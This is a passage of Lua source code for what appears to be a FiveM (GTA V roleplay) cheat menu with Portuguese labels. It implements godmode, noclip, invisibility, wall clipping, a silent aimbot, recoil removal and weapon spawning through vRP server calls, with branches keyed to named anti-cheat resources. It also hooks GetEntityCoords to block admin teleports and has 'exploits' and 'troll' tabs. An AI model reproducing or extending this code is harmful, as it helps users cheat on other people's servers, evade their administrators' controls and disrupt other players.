        if IsDisabledControlPressed(0, 14) and y > (0.355 - (25 * add)) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["weaponList"].static = scrolls["weaponList"].static - add
        end

        if IsDisabledControlJustPressed(0, 15) and y ~= 0.355 and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["weaponList"].static = scrolls["weaponList"].static + add
        end





        for index, weapon in ipairs(weaponList) do
            local r, g, b = 255, 255, 255

            local selected = false

            local txtdraw = weapon.name

            for _, arma in ipairs(weaponsSelected) do
                if arma == weapon.hash then
                    r, g, b = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b

                    selected = true

                    txtdraw = "• " .. weapon.name
                end
            end



            if y >= 0.4 and y <= max then
                if interact.PlayerButton(txtdraw, 0.445 + Loader_X, y - 0.05 + Loader_Y, false, r, g, b) then
                    if selected then
                        for i, arma in ipairs(weaponsSelected) do
                            if arma == weapon.hash then
                                table.remove(weaponsSelected, i)
                            end
                        end
                    else
                        table.insert(weaponsSelected, weapon.hash)
                    end
                end
            end



            y = y + add
        end
    end,



    callSpawnVehicleList = function()
        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        texts.drawTextColor("Lista Spawn de Veículos", 0.55 + Loader_X, 0.37 + Loader_Y - 0.03, false, false, 0.32, 11,
            overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b, math.ceil(overlay.opacitys.contents))

        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        local dW = psychovars.list.MesosnuW - 0.5

        local dH = psychovars.list.MesosnuH - 0.424

        local y = 0.295 + scrolls['vehicleSpawnList'].static

        local add = 0.03

        local max = 0.6



        if IsDisabledControlPressed(0, 36) and IsDisabledControlJustPressed(0, 177) then
            vehicleSelected = nil
        end





        if IsDisabledControlPressed(0, 14) and y > (0.355 - (25 * add)) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["vehicleSpawnList"].static = scrolls["vehicleSpawnList"].static - add
        end

        if IsDisabledControlJustPressed(0, 15) and y ~= 0.355 and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["vehicleSpawnList"].static = scrolls["vehicleSpawnList"].static + add
        end





        for index, vehicle in ipairs(vehicleListSpawn) do
            local r, g, b = 255, 255, 255

            local txtdraw = vehicle.name

            if vehicleSelected == vehicle.hash then
                r, g, b = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b

                txtdraw = "• " .. vehicle.name
            end



            if y >= 0.4 and y <= max then
                if interact.PlayerButton(txtdraw, 0.445 + Loader_X, y - 0.05 + Loader_Y, false, r, g, b) then
                    if vehicleSelected == vehicle.hash then
                        vehicleSelected = nil
                    else
                        vehicleSelected = vehicle.hash
                    end
                end
            end



            y = y + add
        end
    end,



    updateVehicleList = function()
        Citizen.CreateThread(function()
            while true do
                if psychovars.main.tab == "vehicles" then
                    local activeVehicles = GetAllVeh()

                    local playercoords = GetEntityCoords(PlayerPedId())

                    vehlist = {}



                    for k, vehicle in ipairs(activeVehicles) do
                        local modelName = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle))

                        if modelName ~= "FREIGHT" and modelName ~= "CARNOTFOUND" then
                            local targetcoords = GetEntityCoords(vehicle)

                            local distance = GetDistanceBetweenCoords(playercoords, targetcoords, true)

                            table.insert(vehlist, { vehicle = vehicle, distance = distance })
                        end
                    end



                    table.sort(vehlist, function(a, b)
                        return a.distance < b.distance
                    end)
                end



                --verify current vehicles

                for k, vehicle in pairs(vehiclesSelected) do
                    local vehCoords = GetEntityCoords(vehicle)

                    local selfCoords = GetEntityCoords(PlayerPedId())

                    local distance = GetDistanceBetweenCoords(selfCoords, vehCoords, false)

                    if distance > listVariables.distanceLimit then
                        table.remove(vehiclesSelected, k)
                    end
                end



                Wait(2000)
            end
        end)
    end,



    menuscheck = function()
        -- Ped Entities

        local ymenu = 0.361

        local yadd = 0.038



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "self" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "self"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        ymenu = ymenu + yadd - 0.003

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "players" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "players"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        -- Weapons



        local ymenu = 0.452

        local yadd = 0.03



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "weapon" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "weapon"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "aimbot" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "aimbot"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        -- Vehicle Entities



        local ymenu = 0.525

        local yadd = 0.03



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "vehicle" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "vehicle"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "vehicles" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "vehicles"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        -- Visual



        local ymenu = 0.615

        local yadd = 0.025



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "visual" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "visual"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        -- Outhers



        local ymenu = 0.66

        local yadd = 0.031



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "trolloptions" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "trolloptions"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "exploits" then
                overlay.opacitys.contents = 0
            end

            local yvalue = 0.32 + scrolls["exploits"].static
            local addbutton = 0.045
            local addbutton2 = 0.030
            local max = 0.76

            interact.Scroll(10, "exploits")

            psychovars.main.tab = "exploits"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end



        ymenu = ymenu + yadd

        if interact.invisiblebutton(0.31, ymenu, 0.062, 0.012) then
            if psychovars.main.tab ~= "config" then
                overlay.opacitys.contents = 0
            end

            psychovars.main.tab = "config"

            overlay.anim.tabpos.xdestin = 0.31

            overlay.anim.tabpos.ydestin = ymenu
        end
    end,



    interactions = function()
        if psychovars.main.tab == "self" then
            local yvalue = 0.32 + scrolls["self"].static

            local y2value = 0.3 + scrolls["self"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(10, "self")



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Reviver", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Revivido!", 255, 255, 255)
                    TriggerEvent('tratamento-macas')
                    local crd = GetEntityCoords(PlayerPedId())
                    Citizen.InvokeNative(0xEA23C49EAA83ACFB,
                        Citizen.InvokeNative(0x1899F328B0E12848, PlayerPedId(), crd.x, crd.y, crd.z),
                        Citizen.InvokeNative(0xE83D4F9BA2A38914, PlayerPedId()))
                    SetEntityCoordsNoOffset(PlayerPedId(), crd.x, crd.y, crd.z, false, false, true)
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Suicidio", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Suicidio!", 255, 255, 255)
                    SetEntityHealth(PlayerPedId(), 0)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Desgrudar do Adm", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Desgrudado!", 255, 255, 255)
                    DetachEntity(PlayerPedId(-1), true, false)
                    TriggerEvent("vrp_policia:tunnel_req", "arrastar", {}, "vrp_policia", -1)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Limpar Ferimentos", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Ferimentos Limpos!", 255, 255, 255)
                    ClearPedBloodDamage(PlayerPedId())
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.godmode, "GodMode", 0.43, yvalue, function()
                    healthmodule.godmode = not healthmodule.godmode
                end)
            end

            if segurarvvv then
    local holdingEntity = false
    local heldEntity = nil

    Citizen.CreateThread(function()
        while segurarvvv do
            Citizen.Wait(0)
            local playerPed = PlayerPedId()
            local camPos = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local direction = RotationToDirection(camRot)
            local dest = camPos + direction * 10.0

            local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, 10, playerPed, 0)
            local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
            local validTarget = false

            if hit == 1 and entityHit and DoesEntityExist(entityHit) then
                local entityType = GetEntityType(entityHit)
                if (entityType == 2 or entityType == 3) and NetworkHasControlOfEntity(entityHit) then
                    validTarget = true

                    SetTextScale(0.35, 0.35)
                    SetTextFont(4)
                    SetTextProportional(1)
                    SetTextColour(255, 255, 255, 230)
                    SetTextCentre(true)
                    SetTextDropshadow(0, 0, 0, 0, 255)
                    SetTextEdge(1, 0, 0, 0, 255)

                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName("[Y] Para Pegar a Entidade")
                    EndTextCommandDisplayText(GetActiveScreenResolution()/2, GetActiveScreenResolution() - 110)

                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName("[U] Para Soltar / Aplicar Força")
                    EndTextCommandDisplayText(GetActiveScreenResolution()/2, GetActiveScreenResolution() - 90)
                end
            end

            if IsControlJustReleased(0, 246) then
                if not holdingEntity and validTarget then
                    holdingEntity = true
                    heldEntity = entityHit
                    FreezeEntityPosition(heldEntity, true)
                elseif holdingEntity and heldEntity then
                    FreezeEntityPosition(heldEntity, false)
                    local dir = RotationToDirection(GetGameplayCamRot(2))
                    ApplyForceToEntity(heldEntity, 1, dir.x * 100.0, dir.y * 100.0, dir.z * 100.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                    holdingEntity = false
                    heldEntity = nil
                end
            end

            if holdingEntity and heldEntity and DoesEntityExist(heldEntity) then
                local forwardPos = GetOffsetFromEntityInWorldCoords(playerPed, 0.0, 4.0, 0.5)
                SetEntityCoordsNoOffset(heldEntity, forwardPos.x, forwardPos.y, forwardPos.z, true, true, true)

                local camRot = GetGameplayCamRot(2)
                SetEntityRotation(heldEntity, 0.0, 0.0, camRot.z, 2, true)
            end
        end
    end)
end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(segurarvvv, "Segurar Veiculos", 0.43, yvalue, function()
                    segurarvvv = not segurarvvv
                end)
            end

            if session then
                NetworkStartSoloTutorialSession()
            else
                NetworkEndTutorialSession()
            end
            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(session, "Solo Session", 0.43, yvalue, function()
                    session = not session
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.antitaze, "Anti Tazer", 0.43, yvalue, function()
                    healthmodule.antitaze = not healthmodule.antitaze

                    if healthmodule.antitaze then
                        SetPedMinGroundTimeForStungun(PlayerPedId(), 0)
                    elseif not healthmodule.antitaze then
                        SetPedMinGroundTimeForStungun(PlayerPedId(), 3600)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.ragd0ll, "No Ragdoll", 0.43, yvalue, function()
                    healthmodule.ragd0ll = not healthmodule.ragd0ll

                    local ped = PlayerPedId()

                    if healthmodule.ragd0ll then
                        SetPedCanRagdoll(PlayerPedId(), false)

                        SetPedRagdollOnCollision(ped, false)

                        SetPedRagdollBlockingFlags(ped, 0)

                        SetPedRagdollBlockingFlags(ped, 0)
                    elseif not healthmodule.ragd0ll then
                        SetPedCanRagdoll(PlayerPedId(), true)

                        SetPedRagdollOnCollision(ped, true)

                        SetPedRagdollBlockingFlags(ped, 1)

                        SetPedRagdollBlockingFlags(ped, 1)
                    end
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.s0c4o, "Super Soco", 0.43, yvalue, function()
                    healthmodule.s0c4o = not healthmodule.s0c4o

                    if not healthmodule.s0c4o then
                        SetWeaponDamageModifierThisFrame(GetHashKey('WEAPON_UNARMED'), 10000.0)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.st4m1n3, "Stamina Infinita", 0.43, yvalue, function()
                    healthmodule.st4m1n3 = not healthmodule.st4m1n3

                    if not healthmodule.st4m1n3 then
                        RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
                    end
                end)
            end







            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.na0soc0, "Não Tomar Soco", 0.43, yvalue, function()
                    healthmodule.na0soc0 = not healthmodule.na0soc0

                    if healthmodule.na0soc0 then
                        local ply333r111d = PlayerPedId()

                        SetPedCanBeTargetted(ply333r111d, false)
                    else
                        SetPedCanBeTargetted(ply333r111d, true)
                    end
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.r0d44rm4s, "Tirar Novato", 0.43, yvalue, function()
                    healthmodule.r0d44rm4s = not healthmodule.r0d44rm4s
                end)
            end



            if tpto then
                if not _G._GetEntityCoords then
                    _G._GetEntityCoords = _G.GetEntityCoords
                end

                _G.GetEntityCoords = function(ped, asdasdas)
                    if asdasdas == true then
                        return nil
                    else
                        return _G._GetEntityCoords(ped, asdasdas or false)
                    end
                end
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(tpto, "Bloquear (TPTO & TPTOME)", 0.43, yvalue, function()
                    tpto = not tpto
                end)
            end

            yvalue = 0.32 + scrolls["self"].static + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Tpway", 0.615, yvalue, function()
                    cdsmodule.tpway()
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.inv1s1bl3, "Invisivel", 0.622, yvalue, function()
                    healthmodule.inv1s1bl3 = not healthmodule.inv1s1bl3

                    if not healthmodule.inv1s1bl3 then
                        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, true)

                        SetEntityVisible(PlayerPedId(), true)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.v0nc, "Noclip", 0.622, yvalue, function()
                    healthmodule.v0nc = not healthmodule.v0nc
                end)
            end

            yvalue = yvalue + 0.01

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("n0clip", 0.631, yvalue, 1, 0.09)
            end



            yvalue = yvalue + addbutton2 - 0.005

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.at77av3ssarpar3d, "Atravessar Paredes", 0.622, yvalue, function()
                    healthmodule.at77av3ssarpar3d = not healthmodule.at77av3ssarpar3d

                    if healthmodule.at77av3ssarpar3d then
                        Citizen.CreateThread(function()
                            local pl43r1d = PlayerPedId()

                            while healthmodule.at77av3ssarpar3d do
                                SetPedCapsule(pl43r1d, 0.0001)

                                Wait(0)
                            end
                        end)
                    end
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.f4strun, "Correr Rápido", 0.622, yvalue, function()
                    healthmodule.f4strun = not healthmodule.f4strun

                    local sp3edrun = Sliders['fastrun'].value

                    if not healthmodule.f4strun then
                        SetPedCanRagdoll(PlayerPedId(), true)

                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                    end
                end)
            end



            yvalue = yvalue + 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("fastrun", 0.650, yvalue, 1, 0.06)
            end

            yvalue = yvalue + addbutton2 - 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(healthmodule.s4po, "Super Pulo", 0.622, yvalue, function()
                    healthmodule.s4po = not healthmodule.s4po
                end)
            end

            yvalue = yvalue + 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("s4populo", 0.645, yvalue, 1, 0.07)
            end
        elseif psychovars.main.tab == "weapon" then
            callfunc.callWeaponsList()



            local yvalue = 0.32 + scrolls["weapon"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(5, "weapon")

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Spawnar Armas ~b~(Selecionadas)", 0.424, yvalue, function()
                    local function PuxarArma(weaponsSelected)
                        Citizen.CreateThread(function()
                            local playerPed = PlayerPedId()

                            if getsource('likizao_ac') then
                                for i, weapon in ipairs(weaponsSelected) do
                                    Notify("Sucesso", "camargo-sucess", "Arma Spawnada: " .. weapon .. "!", 255, 255, 255)
                                    GiveWeaponToPed(playerPed, GetHashKey(weapon), 250, false, false)
                                    Citizen.Wait(500)
                                    HudSetWeaponWheelTopSlot(weapon)
                                    Citizen.Wait(1000)
                                end
                            elseif getsource('PL_PROTECT') then
                                for _, weapon in ipairs(weaponsSelected) do
                                    local Tunnel = module("vrp", "lib/Tunnel")
                                    local Proxy = module("vrp", "lib/Proxy")
                                    vRP = Proxy.getInterface("vRP")
                                    Notify("Sucesso", "camargo-sucess", "Arma Spawnada: " .. weapon .. "!", 255, 255, 255)
                                    tvRP.giveWeapons({ [weapon] = { ammo = 250 } })
                                    Citizen.Wait(500)
                                    vRP.giveWeapons({ [weapon] = { ammo = 250 } })
                                    Citizen.Wait(500)

                                    HudSetWeaponWheelTopSlot(weapon)
                                    Citizen.Wait(1000)
                                end
                            elseif getsource('vrpserver') then
                                for _, weapon in ipairs(weaponsSelected) do
                                    Notify("Sucesso", "camargo-sucess", "Arma Spawnada: " .. weapon .. "!", 255, 255, 255)
                                    local Tunnel = module("vrp", "lib/Tunnel")
                                    local Proxy = module("vrp", "lib/Proxy")
                                    vRP = Proxy.getInterface("vRP")
                                    vRP.giveWeapons({ [weapon] = { ammo = 200 } })
                                end
                            else
                                for _, weapon in ipairs(weaponsSelected) do
                                    Notify("Sucesso", "camargo-sucess", "Arma Spawnada: " .. weapon .. "!", 255, 255, 255)
                                    tvRP.giveWeapons({ [weapon] = { ammo = 250 } })
                                    Citizen.Wait(500)
                                    HudSetWeaponWheelTopSlot(weapon)
                                    Citizen.Wait(1000)
                                end
                            end
                        end)
                    end

                    PuxarArma(weaponsSelected)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Remover Armas ~b~(Todas)", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Armas Removidas!", 255, 255, 255)
                    RemoveAllPedWeapons(PlayerPedId())
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Setar Munição ~b~(300)", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Munição Setada! (300)", 255, 255, 255)
                    SetCurrentAmmo()
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Adicionar Attachs", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Attachs Adicionados!", 255, 255, 255)
                    local p333dd = PlayerPedId()

                    local a7mm44 = GetSelectedPedWeapon(p333dd)

                    if GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_PISTOL_MK2") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_PI_RAIL"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_PI_FLSH_02"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_PI_SUPP_02"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_MACHINEPISTOL") then

                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_SMG_MK2") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_SCOPE_SMALL_SMG_MK2"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_PUMPSHOTGUN") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_SR_SUPP"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_SMG") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_SCOPE_MACRO_02"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_PI_SUPP"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_ASSAULTRIFLE_MK2") or GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_CARBINERIFLE_MK2") or GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_SPECIALCARBINE_MK2") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_AFGRIP_02"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_SCOPE_MEDIUM_MK2"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_MUZZLE_02"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_CARBINERIFLE") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"))

                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_AR_AFGRIP"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_COMBATPDW") then
                        GiveWeaponComponentToPed(p333dd, GetHashKey("WEAPON_COMBATPDW"),
                            GetHashKey("COMPONENT_AT_AR_FLSH"))

                        GiveWeaponComponentToPed(p333dd, GetHashKey("WEAPON_COMBATPDW"),
                            GetHashKey("COMPONENT_AT_SCOPE_SMALL"))

                        GiveWeaponComponentToPed(p333dd, GetHashKey("WEAPON_COMBATPDW"),
                            GetHashKey("COMPONENT_AT_AR_AFGRIP"))
                    elseif GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_HEAVYPISTOL") or GetSelectedPedWeapon(p333dd) == GetHashKey("WEAPON_COMBATPISTOL") then
                        GiveWeaponComponentToPed(p333dd, a7mm44, GetHashKey("COMPONENT_AT_PI_FLSH"))
                    end
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Mudar cor da Arma", 0.424, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Cor da arma Mudada!", 255, 255, 255)
                    SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(cordaarmita, "Pintar arma em loop", 0.43, yvalue, function()
                    cordaarmita = not cordaarmita
                end)
            end


            if armitanamaozita then
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(1)
                        SetCurrentPedWeapon(PlayerPedId(), GetHashKey(GetCurrentPedWeapon(PlayerPedId())), true)
                    end
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(armitanamaozita, "Bugar Arma na Mão", 0.43, yvalue, function()
                    armitanamaozita = not armitanamaozita
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(muniinfinita, "Munição Infinita", 0.43, yvalue, function()
                    muniinfinita = not muniinfinita
                end)
            end


            if safez then
                NetworkSetFriendlyFireOption(false)
                DisablePlayerFiring(PlayerId(), false)
                EnableControlAction(0, 140)
                EnableControlAction(0, 24)
                EnableControlAction(0, 140)
                EnableControlAction(0, 142)
                EnableControlAction(0, 257)
                EnableControlAction(0, 70)
                EnableControlAction(0, 69)
            else
                NetworkSetFriendlyFireOption(true)
                DisablePlayerFiring(PlayerId(), true)
                DisableControlAction(0, 140)
                DisableControlAction(0, 24)
                DisableControlAction(0, 140)
                DisableControlAction(0, 142)
                DisableControlAction(0, 257)
                DisableControlAction(0, 70)
                DisableControlAction(0, 69)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(safez, "Matar Safezone", 0.43, yvalue, function()
                    safez = not safez
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(coronha, "Habilitar Coronhada", 0.43, yvalue, function()
                    coronha = not coronha
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(noReload, "Não Recarregar", 0.43, yvalue, function()
                    noReload = not noReload
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("SliderTest", 0.424, yvalue, 1, 0.09)
            end
        elseif psychovars.main.tab == "aimbot" then
            local yvalue = 0.32 + scrolls["aimbot"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(10, "aimbot")







            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(S1l3ntA1m, "Silent", 0.43, yvalue, function()
                    S1l3ntA1m = not S1l3ntA1m
                end)
            end



            yvalue = yvalue + 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.Slider("circulo", 0.45, yvalue, 1, 0.07)
            end


            yvalue = yvalue + addbutton2 - 0.008

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(incluirnpcs, "Aimlock - Npcs", 0.43, yvalue, function()
                    incluirnpcs = not incluirnpcs
                end)
            end

            if recoil then
                Citizen.CreateThread(function()
                    while true do
                        local sleep = 0
                        -- PT MK2
                        SetWeaponRecoilShakeAmplitude(0xBFE256D4, 0.1)
                        -- PT POLICIA
                        SetWeaponRecoilShakeAmplitude(0x5EF9FEC4, 0.2)
                        -- MTAR
                        SetWeaponRecoilShakeAmplitude(0xEFE7E2DF, 0.35)
                        -- AKS
                        SetWeaponRecoilShakeAmplitude(0x624FE830, 0.03)
                        -- AK 103
                        SetWeaponRecoilShakeAmplitude(0x394F415C, 0.1)
                        -- G36
                        SetWeaponRecoilShakeAmplitude(0x969C3D67, 0.15)
                        -- AK 47
                        SetWeaponRecoilShakeAmplitude(0xBFEFFF6D, 0.055)
                        -- PARAFAL
                        SetWeaponRecoilShakeAmplitude(0xC0A3098D, 0.15)
                        -- M4A4 - SEM RECOIL
                        SetWeaponRecoilShakeAmplitude(0xFAD1F1C9, 0.0)
                        -- FAMAS
                        SetWeaponRecoilShakeAmplitude(0x84D6FAFD, 0.0)
                        -- M4A1
                        SetWeaponRecoilShakeAmplitude(0x83BF0278, 0.2)
                        -- THOMPSON
                        SetWeaponRecoilShakeAmplitude(0x61012683, 0.0)
                        -- MICRO-UZI
                        SetWeaponRecoilShakeAmplitude(0x13532244, 0.0)
                        -- MP5 MK2
                        SetWeaponRecoilShakeAmplitude(0x78A97CD0, 0.3)
                        -- MP5
                        SetWeaponRecoilShakeAmplitude(0x2BE6766B, -0.3)
                        -- MPX
                        SetWeaponRecoilShakeAmplitude(0x0A3D4D34, 0.0)
                        -- RAMBO
                        SetWeaponRecoilShakeAmplitude(0x7FD62962, 0.0) -- 1649403952
                        Citizen.Wait(sleep)
                    end
                end)
            end

